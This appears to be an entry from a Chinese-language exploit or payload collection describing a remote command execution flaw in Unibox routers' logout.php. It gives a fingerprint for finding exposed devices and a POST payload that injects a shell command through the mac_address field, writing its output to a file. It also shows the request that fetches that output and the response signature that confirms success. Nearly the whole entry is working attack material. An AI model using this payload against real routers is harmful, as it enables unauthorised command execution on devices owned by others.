# Unibox路由器logout存在远程命令执行漏洞

Unibox ｜ 命令执行 ｜ —
- **指纹**：`body="Unibox"`
- **请求**：`POST /authentication/logout.php HTTP/1.1`

**Payload**
```
logout_user=1&mac_address=;id>7.txt;
命令执行：
GET /authentication/7.txt HTTP/1.1
Host:
```
- **响应特征**：200 uid=